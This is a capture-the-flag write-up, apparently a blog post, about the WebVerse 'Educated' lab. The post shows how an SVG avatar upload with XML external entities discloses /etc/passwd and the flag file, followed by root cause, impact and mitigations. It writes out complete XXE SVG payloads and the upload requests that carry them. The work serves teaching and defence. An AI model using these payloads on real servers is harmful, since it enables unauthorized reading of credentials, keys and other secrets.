---
title: "SVG XXE Leads to Local File Disclosure | Educated"
date: 2026-06-26 10:20:00 +0530
categories: [A05 - Injection, XML External Entity]
tags: [webverse, webverse-pro, educated, xxe, svg-upload, file-disclosure, local-file-read, php, owasp-2025]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/educated.webp
  alt: Educated - SVG XXE Local File Disclosure
---

## Lab Link 

[Educated](https://dashboard.webverselabs-pro.com/mystery-challenges/educated)

## Overview

The **Educated** challenge presented a retro school message-board application with a newly added profile-picture feature. The profile page allowed users to upload avatar images in multiple formats, including SVG. Because SVG is XML-based, accepting and processing SVG files without disabling external entity resolution introduced an **XML External Entity (XXE)** vulnerability.

By uploading a malicious SVG containing an external entity that referenced a local file, the server-side image/profile parser resolved the entity and reflected the file content back into the profile page as the avatar caption. This allowed local file disclosure and ultimately exposed the challenge flag.

## Objective

The goal was to identify the vulnerable upload surface, understand how the uploaded image was parsed, and use the parser behavior to read the flag file from the server.

## Vulnerability Identification

| Field | Value |
| --- | --- |
| Vulnerability | XML External Entity Injection via SVG upload |
| OWASP Top 10:2025 | A05 - Injection |
| Affected Feature | Profile picture upload |
| Endpoint | `POST /profile.php` |
| Render/Display Endpoint | `/avatar.php` |
| Impact | Local file disclosure |
| Final Result | Flag disclosed through profile caption |

The profile page accepted image uploads using a multipart form:

```html
<form method="post" enctype="multipart/form-data" action="/profile.php">
  <input type="file" name="picture" accept=".svg,.jpg,.jpeg,.png,image/svg+xml,image/jpeg,image/png">
  <input type="submit" value="Upload Picture">
</form>
```

The uploaded avatar was then displayed through:

```html
<img src="/avatar.php" width="150" alt="My profile picture" class="bigav">
```

The important observation was that SVG files were explicitly allowed. Since SVG is XML, any backend process that parses the uploaded SVG with unsafe XML settings can be vulnerable to XXE.

## Reconnaissance

A normal JPEG upload was tested first to verify the feature worked as expected. The server accepted the upload and returned a success message:

```http
POST /profile.php HTTP/2
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="picture"; filename="sample.jpg"
Content-Type: image/jpeg

...jpeg data...
------boundary--
```

The response confirmed that the file was saved:

```html
<div class="flash flashok">Your new picture has been saved. It is shown above.</div>
<img src="/avatar.php" width="150" alt="My profile picture" class="bigav">
```

After confirming normal upload behavior, the next step was to upload an SVG containing an external entity.

## Exploitation

### Step 1: Confirm SVG Processing

The application accepted SVG files because the upload input allowed both the `.svg` extension and the `image/svg+xml` MIME type.

This made the profile-picture feature a likely target for XML parsing issues.

### Step 2: Test Local File Disclosure with `/etc/passwd`

The first malicious SVG referenced `/etc/passwd` to confirm whether the backend parser resolved external entities.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="2000" height="1000">
  <rect width="100%" height="100%" fill="white"/>
  <text x="20" y="40" font-size="14" fill="black" font-family="monospace">
    &xxe;
  </text>
</svg>
```

The SVG was uploaded through the profile picture form:

```http
POST /profile.php HTTP/2
Host: <redacted-lab-host>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="picture"; filename="test_xxe.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="2000" height="1000">
  <rect width="100%" height="100%" fill="white"/>
  <text x="20" y="40" font-size="14" fill="black" font-family="monospace">
    &xxe;
  </text>
</svg>

------boundary--
```

The server accepted the file and reflected the resolved entity output inside the profile page:

```html
<div class="capbox">
  <div class="tiny">Picture caption</div>
  <div class="capval">root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
educated:x:1111:1111::/home/educated:/usr/sbin/nologin</div>
</div>
```

This confirmed arbitrary local file disclosure through XXE.

### Step 3: Read the Flag File

After confirming local file read with `/etc/passwd`, the entity target was changed to `/flag.txt`.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="220">
  <rect width="100%" height="100%" fill="white"/>
  <text x="20" y="80" font-size="28" fill="black">&xxe;</text>
</svg>
```

The payload was uploaded as `flag_xxe.svg`:

```http
POST /profile.php HTTP/2
Host: <redacted-lab-host>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="picture"; filename="flag_xxe.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="220">
  <rect width="100%" height="100%" fill="white"/>
  <text x="20" y="80" font-size="28" fill="black">&xxe;</text>
</svg>

------boundary--
```

The server resolved the entity and displayed the flag in the picture caption:

```html
<div class="capbox">
  <div class="tiny">Picture caption</div>
  <div class="capval">WEBVERSE{.....}</div>
</div>
```

## Proof of Exploitation

The final proof was the flag value being rendered in the profile page after uploading the malicious SVG.

```text
WEBVERSE{.....}
```

The full flag is redacted for responsible publishing.

## Root Cause

The root cause was unsafe handling of user-supplied SVG files. The application allowed SVG uploads and passed attacker-controlled XML content into a parser that resolved external entities.

The vulnerable behavior was:

1. User uploads SVG through `/profile.php`.
2. Backend parses the SVG/XML content.
3. External entity resolution is enabled.
4. The parser reads local server files such as `/etc/passwd` and `/flag.txt`.
5. Resolved content is reflected back into the profile page as the picture caption.

## Impact

This vulnerability allowed an attacker to read arbitrary local files that were accessible to the web application process. In a real environment, this could expose:

- application configuration files,
- source code,
- credentials,
- private keys,
- internal service data,
- environment secrets,
- and other sensitive filesystem content.

Depending on the XML parser and network permissions, XXE can sometimes also lead to SSRF against internal services.

## Mitigation

### Disable External Entity Resolution

XML parsers should be configured to disable DTDs and external entity loading.

For PHP/libxml-based XML handling, use secure parser options and avoid loading external entities from untrusted XML. Prefer modern parser configurations that disable network access and external entity expansion.

### Do Not Accept SVG Unless Required

If SVG support is not required, block SVG uploads entirely and only allow safe raster formats such as JPEG and PNG.

### Sanitize SVG Files

If SVG uploads are required, sanitize them with a strict SVG sanitizer that removes:

- `DOCTYPE` declarations,
- external entities,
- scripts,
- event handlers,
- remote references,
- embedded foreign content.

### Validate File Content, Not Just Extension

Do not rely only on file extensions or client-provided MIME types. Validate uploaded files server-side by inspecting their actual content.

### Re-encode Uploaded Images

For profile pictures, a safer pattern is to decode the uploaded image and re-encode it into a trusted raster format before storage and display.

For example:

```text
User upload → validate image → decode safely → re-encode to PNG/JPEG → store generated output
```

This removes XML features from the final stored avatar.

### Apply Least Privilege

The web application should run as a low-privileged user and should not have read access to sensitive files outside its required directories.

## Lessons Learned

- SVG uploads should be treated as XML input, not simple images.
- File upload features can become file-read vulnerabilities when backend parsers process attacker-controlled content.
- A successful `/etc/passwd` read is strong evidence of local file disclosure and should be followed by targeted reads only in authorized lab environments.
- For avatars and profile pictures, rasterizing or re-encoding uploads is usually safer than serving or parsing user-supplied SVG directly.
